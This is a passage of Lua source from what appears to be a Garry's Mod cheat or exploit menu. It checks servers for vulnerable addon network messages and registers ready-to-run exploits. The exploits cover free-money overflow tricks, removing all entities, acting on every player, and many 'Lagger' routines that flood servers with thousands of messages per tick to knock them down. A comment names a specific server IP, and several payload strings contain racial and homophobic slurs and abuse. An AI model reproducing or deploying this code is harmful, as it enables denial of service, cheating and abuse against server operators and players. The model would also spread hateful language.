	    addExploit("221", "Super RP Hit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("hitcomplete")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("SyncRemoveAction")

	if (status) then
	    ECPrint("Found Exploit: Remove All [SyncRemoveAction]")

	    addExploit("222", "Remove All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("SyncRemoveAction")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("TMC_NET_MakePlayerWanted")

	if (status) then
	    ECPrint("Found Exploit: Make All Wanted [TMC_NET_MakePlayerWanted]")

	    addExploit("223", "Make All Wanted", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("TMC_NET_MakePlayerWanted")
	            net.WriteString("bad")
	            net.WriteString("bad")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("thiefnpc")

	if (status) then
	    ECPrint("Found Exploit: Thief NPC [thiefnpc]")

	    addExploit("224", "Thief NPC", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start('thiefnpc')
	        net.WriteDouble(-99999999999999999)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("TMC_NET_FirePlayer")

	if (status) then
	    ECPrint("Found Exploit: Fire Player [TMC_NET_FirePlayer]")

	    addExploit("225", "Fire Player", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("TMC_NET_FirePlayer")
	        net.WriteString("Paypal")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("updateLaws")

	if (status) then
	    ECPrint("Found Exploit: Update Laws [updateLaws]")

	    addExploit("226", "Update Laws", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("updateLaws")
	        net.WriteString("Bitch")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("LotteryMenu")

	if (status) then
	    ECPrint("Found Exploit: Free Money #25 [LotteryMenu]")

	    addExploit("227", "Free Money #25", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("LotteryMenu")
	        net.WriteEntity(LocalPlayer())
	        net.WriteInt(1000000000000000000, 16)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("soundArrestCommit")

	if (status) then
	    ECPrint("Found Exploit: Sound Arrest [soundArrestCommit]")

	    addExploit("228", "Sound Arrest", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("soundArrestCommit")
	        net.WriteString("Shit")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("hoverboardpurchase")

	if (status) then
	    ECPrint("Found Exploit: Hover Board [hoverboardpurchase]")

	    addExploit("229", "Hover Board", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("hoverboardpurchase")
	        net.WriteInt(8, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SpawnProtection")

	if (status) then
	    ECPrint("Found Exploit: Off Spawn Protection [SpawnProtection]")

	    addExploit("230", "Off Spawn Protection", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("SpawnProtection")
	        net.WriteFloat(0)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("NPCShop_BuyItem")

	if (status) then
	    ECPrint("Found Exploit: NPC Shop [NPCShop_BuyItem]")

	    addExploit("231", "NPC Shop", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("NPCShop_BuyItem")
	        net.WriteString("weapon_hack_phone")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("CubeRiot CaptureZone Update")

	if (status) then
	    ECPrint("Found Exploit: CubeRiot Exploit [CubeRiot CaptureZone Update]")

	    addExploit("232", "CubeRiot Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("CubeRiot CaptureZone Update")
	        net.WriteUInt(1, 8)
	        net.WriteVector("2654.989258 2254.119629 -139.968750")
	        net.WriteVector("2654.989258 2254.119629 -139.968750")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("deposit")

	if (status) then
	    ECPrint("Found Exploit: Free Money #26 [deposit]")

	    addExploit("233", "Free Money #26", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("deposit")
	        net.WriteString("-10000000000000000000000")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("AcceptRequest")

	if (status) then
	    ECPrint("Found Exploit: Call Exploit [AcceptRequest]")

	    addExploit("234", "Call Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("AcceptRequest")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("Chess ClientWager")

	if (status) then
	    ECPrint("Found Exploit: Chess Exploit [Chess ClientWager | Chess ClientResign]")

	    addExploit("235", "Chess Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Chess ClientWager")
	        net.WriteUInt(-999999999999999999999999999, 24)
	        net.SendToServer()
	        net.Start("Chess ClientResign")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("netOrgVoteInvite_Server")

	if (status) then
	    ECPrint("Found Exploit: Org Invite All [netOrgVoteInvite_Server]")

	    addExploit("236", "Org Invite All", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("netOrgVoteInvite_Server")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("donatorshop_itemtobuy")

	if (status) then
	    ECPrint("Found Exploit: Donator Box Exploit [donatorshop_itemtobuy]")

	    addExploit("237", "Donator Box Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("donatorshop_itemtobuy")
	        net.WriteString("DonatorShopBuyTripwire")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("AskPickupItemInv")

	if (status) then
	    ECPrint("Found Exploit: Ask Item [AskPickupItemInv]")

	    addExploit("238", "Ask Item", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("AskPickupItemInv")
	            net.WriteUInt(4, 16)
	            net.WriteUInt(1, 16)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("buy_bundle")

	if (status) then
	    ECPrint("Found Exploit: Buy Bundle [buy_bundle]")

	    addExploit("239", "Buy Bundle", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("buy_bundle")
	        net.WriteFloat(1, 16)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("LawyerOfferBail")

	if (status) then
	    ECPrint("Found Exploit: Lawyer Off Bail [LawyerOfferBail | AcceptBailOffer]")

	    addExploit("240", "Lawyer Off Bail", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("LawyerOfferBail")
	            net.WriteEntity(v)
	            net.WriteUInt(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16)
	            net.SendToServer()
	            net.Start("AcceptBailOffer")
	            net.WriteEntity(v)
	            net.WriteUInt(-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 16)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("MineServer")

	if (status) then
	    ECPrint("Found Exploit: Lagger #22 [MineServer]")

	    addExploit("241", "Lagger #22", "lags", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for i = 0, 100 do
	            for k, v in pairs(player.GetAll()) do
	                net.Start("MineServer", true)
	                net.WriteString("sell")
	                net.WriteEntity(v)
	                net.WriteString("Fuck you. Gonna ddos this shitty ass server niggers")
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("Gb_gasstation_BuyGas")

	if (status) then
	    ECPrint("Found Exploit: Ukrainian gas [Gb_gasstation_BuyGas | Gb_gasstation_BuyJerrycan]")

	    addExploit("242", "Ukrainian gas", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Gb_gasstation_BuyGas")
	        net.SendToServer()
	        net.Start("Gb_gasstation_BuyJerrycan")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("D3A_CreateOrg")

	if (status) then
	    ECPrint("Found Exploit: D3A Create Org [D3A_CreateOrg]")

	    addExploit("243", "D3A Create Org", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("D3A_CreateOrg")
	        net.WriteString('969690485273489312467812367128312312314')
	        net.WriteString('123712983712984571298712398')
	        net.WriteString("255 255 255")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("Shop_buy")

	if (status) then
	    ECPrint("Found Exploit: SUP Buy Armor [Shop_buy]")

	    addExploit("244", "SUP Buy Armor", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Shop_buy")
	        net.WriteString("Armor")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("LawsToServer")

	if (status) then
	    ECPrint("Found Exploit: SUP New Laws [LawsToServer]")

	    addExploit("245", "SUP New Laws", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("LawsToServer")
	        net.WriteString("FAGGOTS")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("D3A_Message")

	if (status) then
	    ECPrint("Found Exploit: D3A Message [D3A_Message]")

	    addExploit("246", "D3A Message", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local stuff = {}
	        net.Start("D3A_Message")
	        net.WriteString("FAGGOTS")
	        net.WriteTable(stuff)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("misswd_accept")

	if (status) then
	    ECPrint("Found Exploit: Misswd Accept [misswd_accept]")

	    addExploit("247", "Misswd Accept", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            for i = 0, 100 do
	                net.Start("misswd_accept")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("ScannerMenu")

	if (status) then
	    ECPrint("Found Exploit: Scanner Exploit [ScannerMenu]")

	    addExploit("248", "Scanner Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("ScannerMenu")
	            net.WriteEntity(v)
	            net.WriteFloat(1)
	            net.WriteFloat(1)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("ORG_NewOrg")

	if (status) then
	    ECPrint("Found Exploit: New ORG [ORG_NewOrg]")

	    addExploit("249", "New ORG", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ORG_NewOrg")
	        net.WriteString("I FUCKING HATE YOU!")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ORG_VaultDonate")

	if (status) then
	    ECPrint("Found Exploit: Free Money #27 [ORG_VaultDonate]")

	    addExploit("250", "Free Money #27", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ORG_VaultDonate")
	        net.WriteFloat(-1000000000000000000000000000000000000000000000000000000)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("Selldatride")

	if (status) then
	    ECPrint("Found Exploit: Sell Datride [Selldatride]")

	    addExploit("251", "Sell Datride", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("Selldatride")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("passmayorexam")

	if (status) then
	    ECPrint("Found Exploit: Passexam Exploit [passmayorexam]")

	    addExploit("252", "Passexam Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("passmayorexam")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("levelup_useperk")

	if (status) then
	    ECPrint("Found Exploit: LevelUp Exploit [levelup_useperk]")

	    addExploit("253", "LevelUp Exploit", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("levelup_useperk")
	        net.WriteInt(1, 8)
	        net.WriteInt(2, 8)
	        net.WriteInt(3, 8)
	        net.WriteInt(4, 8)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ZED_SpawnCar")

	if (status) then
	    ECPrint("Found Exploit: ZED Spawn Car [ZED_SpawnCar]")

	    addExploit("254", "ZED Spawn Car", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ZED_SpawnCar")
	        net.WriteFloat(1)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DeployMask") -- 37.230.228.248:27016

	if (status) then
	    ECPrint("Found Exploit: To wear a gas mask at all players [DeployMask]")

	    addExploit("255", "To wear a gas mask", "Exploit puts gas masks on all players, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("DeployMask")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("RemoveMask") -- 37.230.228.248:27016

	if (status) then
	    ECPrint("Found Exploit: Remove the gas mask from all players [RemoveMask]")

	    addExploit("256", "Remove the gas mask", "The exploit takes off gas masks from all players, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("RemoveMask")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("SwapFilter") -- 37.230.228.248:27016

	if (status) then
	    ECPrint("Found Exploit: Change all filters of a gas mask [SwapFilter]")

	    addExploit("257", "Change all filters", "Exploit changes the filter for all gas masks, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("SwapFilter")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("WipeMask") -- 37.230.228.248:27016

	if (status) then
	    ECPrint("Found Exploit: Wipe gas masks [WipeMask]")

	    addExploit("258", "Wipe gas masks", "Exploit wipes all gas masks, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("WipeMask")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("UseMedkit") -- 37.230.228.248:27016

	if (status) then
	    ECPrint("Found Exploit: Use Medkit [UseMedkit]")

	    addExploit("259", "Use Medkit", "Exploit uses a first aid kit on all players, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("UseMedkit")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("IDInv_RequestBank")

	if (status) then
	    ECPrint("Found Exploit: Lagger #23 [IDInv_RequestBank]")

	    addExploit("260", "Lagger #23", "an exploit in the addon 'IDinventory', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("lagger23") then
	            timer.Create("lagger23", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("IDInv_RequestBank", true)
	                    net.SendToServer()
	                end
	            end)
	        end
	    end)
	end

	status = ValidNetString("casinokit_chipexchange")

	if (status) then
	    ECPrint("Found Exploit: Lagger #24 [casinokit_chipexchange]")

	    addExploit("261", "Lagger #24", "an exploit in the addon 'CasinoKit', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("lagger24") then
	            timer.Create("lagger24", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("casinokit_chipexchange", true)
	                    net.WriteEntity(LocalPlayer())
	                    net.WriteString("darkrp")
	                    net.WriteBool(false)
	                    net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                    net.SendToServer()
	                end
	            end)
	        end
	    end)
	end

	status = ValidNetString("RemoveTag")

	if (status) then
	    ECPrint("Found Exploit: 1tap server [RemoveTag]")

	    addExploit("262", "1tap server", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("1tap", 0.5, 0, function()
	            for i = 1, 4000 do
	                net.Start("RemoveTag")
	                net.WriteFloat(9999999999999999999999999999999999999999999999999999999999)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("desktopPrinter_Withdraw")

	if (status) then
	    ECPrint("Found Exploit: Lagger #25 [desktopPrinter_Withdraw]")

	    addExploit("263", "Lagger #25", "an exploit in the addon 'Desktop Printers', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("lagger25") then
	            timer.Create("lagger25", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("desktopPrinter_Withdraw", true)
	                    net.WriteEntity(LocalPlayer())
	                    net.SendToServer()
	                end
	            end)
	        end
	    end)
	end

	status = ValidNetString("sphys_dupe")

	if (status) then
	    ECPrint("Found Exploit: Lagger #26 [sphys_dupe]")

	    addExploit("264", "Lagger #26", "an exploit in the addon 'Simfphys', discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger26", 0.2, 0, function()
	            for i = 1, 2200 do
	                net.Start("sphys_dupe", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("simfphys_gasspill")

	if (status) then
	    ECPrint("Found Exploit: Poop on players [simfphys_gasspill]")

	    addExploit("265", "Poop on players", "an exploit in the addon 'Simfphys', discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("poop", 0.1, 0, function()
	            for k, v in pairs(player.GetAll()) do
	                for j = 1, 3 do
	                    if IsValid(v) then
	                        net.Start("simfphys_gasspill")
	                        net.WriteVector(v:GetPos() + Vector(0, 0, 90))
	                        net.WriteVector(v:EyePos())
	                        net.SendToServer()
	                    end
	                end
	            end
	        end)
	    end)
	end

	status = ValidNetString("dronesrewrite_controldr")

	if (status) then
	    ECPrint("Found Exploit: Lagger #27 [dronesrewrite_controldr]")

	    addExploit("266", "Lagger #27", "discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger27", 0.2, 0, function()
	            for i = 1, 2200 do
	                net.Start("dronesrewrite_controldr", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("SCP-294Sv")

	if (status) then
	    ECPrint("Found Exploit: SCP-294 Exploit [SCP-294Sv]")

	    addExploit("267", "SCP-294 Exploit", "discovered by questionmark", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("SCP-294Sv")
	            net.WriteString("acid")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("VC_PlayerReady")

	if (status) then
	    ECPrint("Found Exploit: Lagger #28 [VC_PlayerReady]")

	    addExploit("268", "Lagger #28", "an exploit in the addon 'VCMod', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger28", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("VC_PlayerReady", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("phone")

	if (status) then
	    ECPrint("Found Exploit: Call all players [phone]")

	    addExploit("269", "Call all players", "discovered by questionmark", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("phone")

	            net.WriteTable{
	                ply = v,
	                act = 'call'
	            }

	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("blueatm")

	if (status) then
	    ECPrint("Found Exploit: Lagger #29 [blueatm]")

	    addExploit("270", "Lagger #29", "an exploit in the addon 'Blue ATM', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger29", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("blueatm", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("cab_cd_testdrive")

	if (status) then
	    ECPrint("Found Exploit: Stavox Teleport [cab_cd_testdrive]")

	    addExploit("271", "Stavox Teleport", "discovered by Aromatic", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start('cab_cd_testdrive')
	        net.WriteUInt(0, 3)
	        net.WriteUInt(5, 8)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("cab_sendmessage")

	if (status) then
	    ECPrint("Found Exploit: Stavox Message [cab_sendmessage]")

	    addExploit("272", "Stavox Message", "discovered by Aromatic", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("cab_sendmessage")
	            net.WriteEntity(v)
	            net.WriteString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("disguise")

	if (status) then
	    ECPrint("Found Exploit: Lagger #30 [disguise]")

	    addExploit("273", "Lagger #30", "discovered by Aromatic & Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger30", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("disguise", true)
	                net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("FARMINGMOD_DROPITEM")

	if (status) then
	    ECPrint("Found Exploit: Lagger #31 [FARMINGMOD_DROPITEM]")

	    addExploit("274", "Lagger #31", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger31", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("FARMINGMOD_DROPITEM", true)
	                net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 16)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("SlotsRemoved")

	if (status) then
	    ECPrint("Found Exploit: Lagger #32 [SlotsRemoved]")

	    addExploit("275", "Lagger #32", "an exploit in the addon 'PointShop 2 Perma Weapons', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger32", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("SlotsRemoved", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("AirDrops_StartPlacement")

	if (status) then
	    ECPrint("Found Exploit: Lagger #33 [AirDrops_StartPlacement]")

	    addExploit("276", "Lagger #33", "an exploit in the addon 'PointShop 2 AirDrops', discovered by Dembi", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger33", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("AirDrops_StartPlacement", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("pp_info_send")

	if (status) then
	    ECPrint("Found Exploit: Lagger #34 [pp_info_send]")

	    addExploit("277", "Lagger #34", "an exploit in the addon 'Perma Props',discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger33", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("pp_info_send", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("IGS.GetPaymentURL")

	if (status) then
	    ECPrint("Found Exploit: Lagger #35 [IGS.GetPaymentURL]")

	    addExploit("278", "Lagger #35", "an exploit in the 'IGS', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger35", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("IGS.GetPaymentURL", true)
	                net.WriteDouble(9999999999999999999999999999999999999999999999999999999999)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("fg_printer_money")

	if (status) then
	    ECPrint("Found Exploit: Lagger #36 [fg_printer_money]")

	    addExploit("279", "Lagger #36", "an exploit in the 'FG Printers', discovered by Aromatic", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger36", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start('fg_printer_money', true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("tickbookpayfine")

	if (status) then
	    ECPrint("Found Exploit: Lagger #37 [tickbookpayfine]")

	    addExploit("280", "Lagger #37", "an exploit in the 'Ticket Book', discovered by Aromatic", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger37", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("tickbookpayfine", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("BeginSpin")

	if (status) then
	    ECPrint("Found Exploit: Lagger #38 [BeginSpin]")

	    addExploit("281", "Lagger #38", "an exploit in the 'Blue Unbox 2', discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger38", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("BeginSpin", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("DuelRequestClient")

	if (status) then
	    ECPrint("Found Exploit: Lagger #39 [DuelRequestClient]")

	    addExploit("282", "Lagger #39", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger39", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("DuelRequestClient", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("ncpstoredoact")

	if (status) then
	    ECPrint("Found Exploit: Lagger #40 [ncpstoredoact]")

	    addExploit("283", "Lagger #40", "an exploit in the addon 'NPC Store',discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger40", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("ncpstoredoact", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("PermwepsNPCSellWeapon")

	if (status) then
	    ECPrint("Found Exploit: Lagger #41 [PermwepsNPCSellWeapon]")

	    addExploit("284", "Lagger #41", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger41", 0, 0, function()
	            for i = 1, 2000 do
	                net.Start("PermwepsNPCSellWeapon", true)
	                net.WriteString("")
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("bitcoins_request_withdraw")

	if (status) then
	    ECPrint("Found Exploit: Lagger #42 [bitcoins_request_withdraw]")

	    addExploit("285", "Lagger #42", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger42", 0, 0, function()
	            for i = 1, 2000 do
	                net.Start("bitcoins_request_withdraw", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("bitcoins_request_turn_on")

	if (status) then
	    ECPrint("Found Exploit: To include all bitcoin miners [bitcoins_request_turn_on]")

	    addExploit("286", "To include all bitcoin miners", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
	                net.Start("bitcoins_request_turn_on")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("bitcoins_request_turn_off")

	if (status) then
	    ECPrint("Found Exploit: Disable all bitcoin miners [bitcoins_request_turn_off]")

